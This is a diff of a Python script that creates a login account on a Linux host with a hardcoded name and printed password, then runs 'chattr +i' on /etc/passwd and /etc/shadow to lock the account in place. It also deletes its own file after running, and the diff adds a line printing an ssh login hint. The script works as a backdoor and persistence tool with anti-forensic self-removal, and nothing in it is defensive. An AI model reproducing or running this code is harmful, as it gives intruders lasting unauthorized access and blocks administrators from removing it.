@@ -2,7 +2,7 @@
 # !/usr/bin/env python
 from __future__ import print_function
 import subprocess
-import sys,os
+import sys, os
 
 
 def ml(command):
@@ -30,6 +30,7 @@ def adduser(user, password):
     j2 = ml(command)
     if user in j and user in j2:
         print("----------------------->user：" + user + "password: " + password + "< -----------------------")
+        print('ssh  ' + user + '@ip')
         ml('chattr +i /etc/passwd')
         ml('chattr +i /etc/shadow')
     else:
@@ -53,9 +54,10 @@ def delete_current_script():
     try:
         script_path = os.path.abspath(sys.argv[0])
         os.remove(script_path)
-        print("当前脚本文件已成功删除"+script_path)
+        print("当前脚本文件已成功删除" + script_path)
     except Exception as e:
         print("无法删除当前脚本文件：", e)
+
 
 if __name__ == '__main__':
     user = 'passw123'
